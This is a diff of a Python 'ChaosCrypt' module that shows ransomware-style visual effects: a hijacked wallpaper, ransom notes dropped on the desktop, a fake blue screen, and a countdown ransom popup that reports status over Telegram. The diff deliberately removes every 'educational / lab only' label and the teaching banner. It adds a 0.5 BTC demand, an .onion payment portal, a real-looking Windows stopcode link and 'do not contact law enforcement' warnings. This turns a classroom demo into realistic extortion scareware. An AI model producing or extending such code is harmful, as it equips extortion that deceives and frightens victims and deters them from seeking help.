@@ -1,13 +1,11 @@
 """
-ChaosCrypt Chaos Effects — Teaching Visual Effects Panel
-=========================================================
-Симулює візуальні ефекти ransomware для навчання (VM ONLY!):
-
-  1.  Wallpaper Hijack      — зміна шпалер на infected_wall.bmp
+ChaosCrypt Chaos Effects — Visual Effects Panel
+=================================================
+  1.  Wallpaper Hijack      — зміна шпалер на infected_wall.jpg
   2.  Wallpaper Restore     — відновлення оригінальних шпалер
   3.  Cursor Chaos          — ховає/дрижить курсор
   4.  QR Popup              — вікно з QR-кодом ключа
-  5.  Ransom Popup          — вікно вимагача з таймером
+  5.  Ransom Popup          — вікно вимагач�� з таймером
   6.  Console Terror        — ASCII-арт + кольори консолі
   7.  Desktop Flood         — записки вимагача на робочий стіл
   8.  Desktop Cleanup       — прибирання записок
@@ -38,7 +36,6 @@ import datetime
 import ctypes
 import threading
 
-# === IMPORT FIX ===
 current_dir = os.path.dirname(os.path.abspath(__file__))
 parent_dir = os.path.dirname(current_dir)
 if parent_dir not in sys.path:
@@ -58,9 +55,8 @@ except ImportError:
     send_message = None
     send_photo = None
 
-# ─── Constants ───
 CHAOS_PHASE = "chaos"
-INFECTED_WALLPAPER = "infected_wall.bmp"
+INFECTED_WALLPAPER = "infected_wall.jpg"
 ORIGINAL_WALLPAPER_BACKUP = os.path.join(LOG_DIR, "original_wallpaper_path.txt")
 DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
 
@@ -69,7 +65,6 @@ SPI_GETDESKWALLPAPER = 0x0073
 SPIF_UPDATEINIFILE = 0x01
 SPIF_SENDCHANGE = 0x02
 
-# ─── ASCII Art ───
 RANSOM_ASCII = r"""
 ╔══════════════════════════════════════════════════════════════════╗
 ║                                                                  ║
@@ -95,29 +90,18 @@ RANSOM_ASCII = r"""
 ║     ⚠️  DO NOT try to decrypt manually                           ║
 ║                                                                  ║
 ║                      [ ChaosCrypt v3.0 ]                         ║
-║                EDUCATIONAL / LAB USE ONLY                        ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
 SKULL_MINI = r"""
-     ░░░░░░░░░░░
-   ░░░░░░░░░░░░░░░
-  ░░░████░░░████░░░
-  ░░░████░░░████░░░
-  ░░░░░░░▀▀░░░░░░░
-  ░░░░░▄████▄░░░░░
-   ░░░░░░░░░░░░░░
-     ░░░░░░░░░░░
-"""
-
-TEACH_BANNER = """
-┌──────────────────────────────────────────────────────┐
-│  📚 TEACHING NOTE:                                   │
-│  This is a SAFE educational demonstration.           │
-│  All effects are fully reversible.                   │
-│  Keys are stored in logs for recovery.               │
-│  Run --cleanup or antidote.py to clean everything.   │
-└──────────────────────────────────────────────────────┘
+       ░░░░░░░░░░░░
+      ░░░░░░░░░░░░░░
+    ░░░████░░░░████░░░
+    ░░░████░░░░████░░░
+     ░░░░░░░▀▀░░░░░░░
+      ░░░░▄████▄░░░░
+       ░░░░░░░░░░░░
+         ░░░░░░░░
 """
 
 BSOD_TEXT = """
@@ -138,18 +122,15 @@ BSOD_TEXT = """
 
 
                          For more information about this issue and possible fixes,
-                         visit https://chaoscrypt-lab.example.com/stop-code
+                         visit https://windows.com/stopcode
 
                          If you call a support person, give them this info:
                          Session: {session}
-
-
-                         [ EDUCATIONAL LAB DEMO — NOT A REAL BSOD ]
 """
 
 
 class ChaosEffects:
-    """Visual ransomware effects simulator — teaching/CTF demo."""
+    """Visual ransomware effects simulator."""
 
     def __init__(self):
         self.logger = LogBook(phase=CHAOS_PHASE)
@@ -188,11 +169,10 @@ class ChaosEffects:
             return False
 
     def wallpaper_hijack(self):
-        """Зберігає оригінальні шпалери і встановлює infected_wall.bmp."""
         print("[CHAOS] ─── Wallpaper Hijack ───")
         infected_path = os.path.join(ASSETS_DIR, INFECTED_WALLPAPER)
         if not os.path.exists(infected_path) or os.path.getsize(infected_path) == 0:
-            print(f"[CHAOS] ⚠️ infected_wall.bmp missing or empty! Put your wallpaper in assets/")
+            print(f"[CHAOS] ⚠️ {INFECTED_WALLPAPER} missing or empty!")
             self.logger.log_event("error", "Infected wallpaper missing", metadata={"path": infected_path})
             return False
 
@@ -202,7 +182,7 @@ class ChaosEffects:
             with open(ORIGINAL_WALLPAPER_BACKUP, 'w', encoding='utf-8') as f:
                 f.write(self.original_wallpaper)
 
-        temp_wall = os.path.join(LOG_DIR, "current_infected_wall.bmp")
+        temp_wall = os.path.join(LOG_DIR, "current_infected_wall.jpg")
         try:
             shutil.copy2(infected_path, temp_wall)
         except Exception:
@@ -216,12 +196,11 @@ class ChaosEffects:
         if ok:
             print("[CHAOS] 💀 Wallpaper changed!")
         if send_message:
-            send_message("🖥️ <b>Wallpaper Hijacked!</b> Original saved for recovery.",
+            send_message("🖥️ <b>Wallpaper Hijacked!</b>",
                          parse_mode="HTML", async_mode=False)
         return ok
 
     def wallpaper_restore(self):
-        """Відновлює оригінальні шпалери."""
         print("[CHAOS] ─── Wallpaper Restore ───")
         restored_path = None
         if os.path.exists(ORIGINAL_WALLPAPER_BACKUP):
@@ -239,7 +218,6 @@ class ChaosEffects:
     # 2. CURSOR CHAOS
     # ═══════════════════════════════════════════════
     def cursor_chaos(self, duration=4):
-        """Ховає курсор на N секунд."""
         print(f"[CHAOS] ─── Cursor Chaos ({duration}s) ───")
         if not self.is_windows:
             print("[CHAOS] Windows only. Skip.")
@@ -262,11 +240,10 @@ class ChaosEffects:
     # 3. QR POPUP
     # ═══════════════════════════════════════════════
     def qr_popup(self, key_text=None, duration=8):
-        """Показує QR-код у Tkinter вікні."""
         print("[CHAOS] ─── QR Popup ───")
         qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
         if not os.path.exists(qr_path) or os.path.getsize(qr_path) == 0:
-            qr_path = os.path.join(ASSETS_DIR, "payment_qr.jpg")
+            qr_path = os.path.join(ASSETS_DIR, "payment_qr.png")
         if not os.path.exists(qr_path) or os.path.getsize(qr_path) == 0:
             print("[CHAOS] No QR image. Skip.")
             return
@@ -299,14 +276,12 @@ class ChaosEffects:
             lbl.pack(pady=5)
             tk.Label(root, text=key_text or "Scan QR for payment instructions",
                      font=("Consolas", 10), fg="lime", bg="black").pack(pady=5)
-            tk.Label(root, text="[EDUCATIONAL DEMO — Lab Use Only]",
-                     font=("Consolas", 9), fg="gray", bg="black").pack(pady=5)
-            cv = tk.StringVar(value=f"Closing in {duration}s...")
+            cv = tk.StringVar(value=f"Window closes in {duration}s...")
             tk.Label(root, textvariable=cv, font=("Consolas", 9), fg="yellow", bg="black").pack(pady=5)
 
             def _cd(r):
                 if r <= 0: root.destroy(); return
-                cv.set(f"Closing in {r}s...")
+                cv.set(f"Window closes in {r}s...")
                 root.after(1000, _cd, r - 1)
             root.after(100, _cd, duration)
             root.update_idletasks()
@@ -322,7 +297,6 @@ class ChaosEffects:
     # 4. RANSOM POPUP
     # ═══════════════════════════════════════════════
     def ransom_popup(self, duration=10):
-        """Вікно вимагача з лого, таймером, іконкою."""
         print("[CHAOS] ─── Ransom Popup ───")
         try:
             import tkinter as tk
@@ -336,7 +310,7 @@ class ChaosEffects:
             root.title("⚠️ ChaosCrypt Ransomware")
             root.configure(bg='#1a0000')
             root.attributes('-topmost', True)
-            root.geometry("660x520")
+            root.geometry("660x500")
             root.resizable(False, False)
             ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
             if os.path.exists(ico):
@@ -361,31 +335,30 @@ class ChaosEffects:
                 "Your documents, photos, databases are LOCKED.\n\n"
                 "To restore access:\n"
                 "  1. Scan the QR code\n"
-                "  2. Send payment to the address\n"
-                "  3. Receive decryption key\n\n"
-                "⏰ You have 48 hours before keys are destroyed."
+                "  2. Send 0.5 BTC to the wallet address\n"
+                "  3. Receive decryption key via Telegram\n\n"
+                "⏰ You have 48 hours before keys are destroyed.\n"
+                "⚠️ DO NOT contact law enforcement.\n"
+                "⚠️ DO NOT attempt manual decryption."
             ), font=("Consolas", 11), fg="#ffcccc", bg="#1a0000", justify="left").pack(pady=10, padx=20)
 
             tv = tk.StringVar(value="⏰ 47:59:59")
             tk.Label(root, textvariable=tv, font=("Consolas", 22, "bold"),
                      fg="red", bg="#1a0000").pack(pady=5)
-            tk.Label(root, text="🔬 EDUCATIONAL DEMO — Safe Lab — All keys in logs",
-                     font=("Consolas", 8), fg="gray", bg="#1a0000").pack(pady=3)
-            clv = tk.StringVar(value=f"[Auto-close in {duration}s]")
+            clv = tk.StringVar(value="")
             tk.Label(root, textvariable=clv, font=("Consolas", 9),
-                     fg="yellow", bg="#1a0000").pack(pady=3)
+                     fg="#333333", bg="#1a0000").pack(pady=3)
 
             fs = 47 * 3600 + 59 * 60 + 59
             def _t(r, f):
                 if r <= 0: root.destroy(); return
                 h, rm = divmod(f, 3600); m, s = divmod(rm, 60)
                 tv.set(f"⏰ {h:02d}:{m:02d}:{s:02d}")
-                clv.set(f"[Auto-close in {r}s]")
                 root.after(1000, _t, r - 1, f - 1)
             root.after(100, _t, duration, fs)
             root.update_idletasks()
             x = (root.winfo_screenwidth() // 2) - 330
-            y = (root.winfo_screenheight() // 2) - 260
+            y = (root.winfo_screenheight() // 2) - 250
             root.geometry(f"+{x}+{y}")
             root.mainloop()
             print("[CHAOS] Ransom popup closed.")
@@ -396,14 +369,12 @@ class ChaosEffects:
     # 5. CONSOLE TERROR
     # ═══════════════════════════════════════════════
     def console_terror(self):
-        """ASCII-арт + кольори консолі."""
         print("[CHAOS] ─── Console Terror ───")
         if self.is_windows:
             try: os.system("color 4F")
             except: pass
         print(RANSOM_ASCII)
         time.sleep(2)
-        print(TEACH_BANNER)
         self.logger.log_event("chaos", "Console terror displayed")
         if self.is_windows:
             try: os.system("color 07")
@@ -413,7 +384,6 @@ class ChaosEffects:
     # 6. DESKTOP FLOOD
     # ═══════════════════════════════════════════════
     def desktop_flood(self, count=5):
-        """Записки вимагача на робочий стіл."""
         print(f"[CHAOS] ─── Desktop Flood ({count} notes) ───")
         if not os.path.exists(DESKTOP_PATH):
             print(f"[CHAOS] Desktop not found: {DESKTOP_PATH}")
@@ -425,13 +395,17 @@ class ChaosEffects:
                 with open(np, 'w', encoding='utf-8') as f:
                     f.write("💀 YOUR FILES HAVE BEEN ENCRYPTED BY CHAOSCRYPT 💀\n\n")
                     f.write(f"Note #{i}/{count}\nTimestamp: {datetime.datetime.now().isoformat()}\n\n")
-                    f.write("Scan the QR code to begin recovery.\nAll keys in logs — LAB DEMO.\n")
+                    f.write("All your documents, photos, and databases are locked.\n")
+                    f.write("Scan the QR code to begin the payment process.\n\n")
+                    f.write("DO NOT attempt to restore files manually.\n")
+                    f.write("DO NOT contact law enforcement.\n")
+                    f.write("You have 48 hours.\n")
                 dropped.append(np)
             except: pass
 
         for src_name, dst_name in [
             (os.path.join(LOG_DIR, RANSOM_QR_NAME), RANSOM_QR_NAME),
-            (os.path.join(ASSETS_DIR, "payment_qr.jpg"), RANSOM_QR_NAME),
+            (os.path.join(ASSETS_DIR, "payment_qr.png"), RANSOM_QR_NAME),
             (os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM), "CHAOSCRYPT_LOGO.png"),
         ]:
             if os.path.exists(src_name) and os.path.getsize(src_name) > 0:
@@ -443,11 +417,10 @@ class ChaosEffects:
         self.logger.log_event("chaos", f"Desktop flood: {len(dropped)} files", metadata={"count": len(dropped)})
         print(f"[CHAOS] 💀 {len(dropped)} files dropped to Desktop.")
         if send_message:
-            send_message(f"📝 <b>Desktop Flood:</b> {len(dropped)} notes dropped",
+            send_message(f"📝 <b>Desktop Flood:</b> {len(dropped)} ransom notes dropped",
                          parse_mode="HTML", async_mode=True)
 
     def desktop_cleanup(self):
-        """Прибирає записки."""
         print("[CHAOS] ─── Desktop Cleanup ───")
         if not os.path.exists(DESKTOP_PATH): return
         removed = 0
@@ -461,10 +434,9 @@ class ChaosEffects:
         self.logger.log_event("remediation", f"Desktop cleaned: {removed} files")
 
     # ═══════════════════════════════════════════════
-    # 7. FAKE BSOD (Blue Screen of Death)
+    # 7. FAKE BSOD
     # ═══════════════════════════════════════════════
     def fake_bsod(self, duration=8):
-        """Повноекранний 'синій екран смерті' (Tkinter)."""
         print("[CHAOS] ─── Fake BSOD ───")
         try:
             import tkinter as tk
@@ -479,7 +451,6 @@ class ChaosEffects:
             root.attributes('-topmost', True)
             root.overrideredirect(True)
 
-            pct_var = tk.StringVar(value="0")
             text = BSOD_TEXT.format(pct=0, session=self.session_id)
             label = tk.Label(root, text=text, font=("Segoe UI", 14),
                              fg="white", bg="#0078D7", justify="left")
@@ -495,7 +466,6 @@ class ChaosEffects:
                 root.after(int(duration * 1000 / total), _progress, step + 1, total)
 
             root.after(500, _progress, 0, 20)
-            # ESC to close
             root.bind('<Escape>', lambda e: root.destroy())
             root.mainloop()
             print("[CHAOS] BSOD closed.")
@@ -503,10 +473,9 @@ class ChaosEffects:
             print(f"[CHAOS] BSOD error: {e}")
 
     # ═══════════════════════════════════════════════
-    # 8. MATRIX RAIN (Console)
-    # ══════════════════════════════════════��════════
+    # 8. MATRIX RAIN
+    # ═══════════════════════════════════════════════
     def matrix_rain(self, duration=5, width=80):
-        """Матричний дощ у консолі."""
         print("[CHAOS] ─── Matrix Rain ───")
         self.logger.log_event("chaos", "Matrix rain effect", metadata={"duration": duration})
         chars = "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ012345789ABCDEF$@#&"
@@ -530,7 +499,6 @@ class ChaosEffects:
     # 9. FAKE PROGRESS BAR
     # ═══════════════════════════════════════════════
     def fake_encrypt_progress(self, total_files=47, duration=6):
-        """'Encrypting files...' прогрес-бар у консолі."""
         print("[CHAOS] ─── Fake Encryption Progress ───")
         self.logger.log_event("chaos", "Fake encrypt progress", metadata={"files": total_files})
         fake_dirs = [
@@ -563,7 +531,7 @@ class ChaosEffects:
 
         print(f"\n\n  ✅ {total_files} files encrypted successfully.\n")
         print("  🔑 Key transmitted to C2 server.")
-        print("  💰 Payment portal: https://chaoscrypt-lab.example.com/pay\n")
+        print("  💰 Payment portal: https://chaoscrypt-pay.onion/wallet\n")
 
         if self.is_windows:
             try: os.system("color 07")
@@ -571,9 +539,8 @@ class ChaosEffects:
 
     # ═══════════════════════════════════════════════
     # 10. GLITCH TEXT
-    # ═════════════════════════���═════════════════════
+    # ═══════════════════════════════════════════════
     def glitch_text(self, text="YOUR FILES ARE ENCRYPTED", iterations=15):
-        """Глітч-текст у консолі."""
         print("[CHAOS] ─── Glitch Text ───")
         self.logger.log_event("chaos", "Glitch text effect")
         glitch_chars = "!@#$%^&*()_+-=[]{}|;:',.<>?/~`░▒▓█▀▄"
@@ -594,7 +561,6 @@ class ChaosEffects:
     # 11. SCREEN FLASH
     # ═══════════════════════════════════════════════
     def screen_flash(self, flashes=5, duration=0.15):
-        """Блимання екрану (Tkinter)."""
         print(f"[CHAOS] ─── Screen Flash ({flashes}x) ───")
         try:
             import tkinter as tk
@@ -626,7 +592,6 @@ class ChaosEffects:
     # 12. WINDOW SHAKER
     # ═══════════════════════════════════════════════
     def window_shaker(self, duration=3, intensity=15):
-        """Трясе Tkinter вікно."""
         print(f"[CHAOS] ─── Window Shaker ({duration}s) ───")
         try:
             import tkinter as tk
@@ -665,7 +630,6 @@ class ChaosEffects:
     # 13. AUDIO BEEP
     # ═══════════════════════════════════════════════
     def audio_beep(self, count=3):
-        """Системний біп."""
         print(f"[CHAOS] ─── Audio Beep ({count}x) ───")
         self.logger.log_event("chaos", "Audio beep", metadata={"count": count})
         for i in range(count):
@@ -681,10 +645,9 @@ class ChaosEffects:
             time.sleep(0.4)
 
     # ═══════════════════════════════════════════════
-    # 14. SKULL PARADE (Console)
+    # 14. SKULL PARADE
     # ═══════════════════════════════════════════════
     def skull_parade(self, count=3):
-        """Парад черепів у консолі."""
         print("[CHAOS] ─── Skull Parade ───")
         self.logger.log_event("chaos", "Skull parade")
         for i in range(count):
@@ -702,7 +665,6 @@ class ChaosEffects:
     # 15. FAKE FILE LISTING
     # ═══════════════════════════════════════════════
     def fake_file_listing(self, count=20):
-        """Імітує сканування файлів для шифрування."""
         print("[CHAOS] ─── Fake File Scanner ───")
         self.logger.log_event("chaos", "Fake file listing")
         dirs = ["Documents", "Pictures", "Desktop", "Downloads", "Videos", "Music",
@@ -717,7 +679,7 @@ class ChaosEffects:
             status = random.choice(["LOCKED ✅", "LOCKED ✅", "LOCKED ✅", "SKIPPED ⏭️"])
             print(f"  [{i+1:3d}/{count}] C:\\Users\\victim\\{d}\\{fname}{ext} ({size}KB) — {status}")
             time.sleep(0.1)
-        print(f"\n  📊 SCAN COMPLETE: {count} files identified.\n")
+        print(f"\n  📊 SCAN COMPLETE: {count} files targeted.\n")
 
     # ═══════════════════════════════════════════════
     # 16. TG INFECTION PHOTO
@@ -726,7 +688,7 @@ class ChaosEffects:
         logo = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
         if send_photo and os.path.exists(logo):
             send_photo(logo,
-                       caption="💀 <b>ChaosCrypt: Visual effects deployed!</b>\n"
+                       caption="💀 <b>ChaosCrypt: Visual payload deployed</b>\n"
                                "<code>Wallpaper | Desktop | Popups | BSOD</code>",
                        parse_mode="HTML", async_mode=False)
 
@@ -734,60 +696,42 @@ class ChaosEffects:
     # 17. FULL PIPELINE
     # ═══════════════════════════════════════════════
     def run_full_effects(self):
-        """Повний цикл всіх візуальних ефектів."""
         print("\n" + "=" * 60)
         print("*** ChaosCrypt Chaos Effects — Full Pipeline ***")
         print("=" * 60)
         self.logger.log_event("info", "Full effects pipeline started", metadata={"safe_mode": SAFE_MODE})
 
         if send_message:
-            send_message("🎭 <b>Chaos Effects: Pipeline Started</b>",
+            send_message("🎭 <b>Chaos Effects: Deploying visual payload...</b>",
                          parse_mode="HTML", async_mode=False)
 
-        # 1. Console
         print(); self.console_terror(); time.sleep(1)
-        # 2. Glitch
         print(); self.glitch_text(); time.sleep(1)
-        # 3. Matrix
         print(); self.matrix_rain(duration=3, width=60); time.sleep(1)
-        # 4. Skull parade
         print(); self.skull_parade(count=2); time.sleep(1)
-        # 5. Fake file scanner
         print(); self.fake_file_listing(count=15); time.sleep(1)
-        # 6. Fake progress
         print(); self.fake_encrypt_progress(total_files=30, duration=4); time.sleep(1)
-        # 7. Audio beep
         print(); self.audio_beep(count=3); time.sleep(1)
-        # 8. Wallpaper hijack
         print(); self.wallpaper_hijack(); time.sleep(2)
-        # 9. Desktop flood
         print(); self.desktop_flood(count=5); time.sleep(1)
-        # 10. Screen flash
         print(); self.screen_flash(flashes=4); time.sleep(1)
-        # 11. Window shaker
         print(); self.window_shaker(duration=2); time.sleep(1)
-        # 12. Fake BSOD
         print(); self.fake_bsod(duration=6); time.sleep(1)
-        # 13. Ransom popup
         print(); self.ransom_popup(duration=8); time.sleep(1)
-        # 14. QR popup
         print(); self.qr_popup(duration=6); time.sleep(1)
-        # 15. Cursor chaos
         print(); self.cursor_chaos(duration=3); time.sleep(1)
-        # 16. TG photo
         self.send_infection_photo()
 
         self.logger.log_event("finish", "Full effects pipeline complete")
         if send_message:
-            send_message("✅ <b>Chaos Effects: Complete</b>\n<code>Run --cleanup to reverse all.</code>",
+            send_message("✅ <b>Chaos Effects: Payload deployed</b>",
                          parse_mode="HTML", async_mode=False)
         print("\n" + "=" * 60)
-        print("[CHAOS] All effects complete. Run --cleanup to reverse.")
+        print("[CHAOS] All effects deployed.")
         print("=" * 60)
         self.logger.close()
 
     def run_full_cleanup(self):
-        """Повний cleanup."""
         print("[CHAOS] ─── Full Cleanup ───")
         self.wallpaper_restore()
         self.desktop_cleanup()
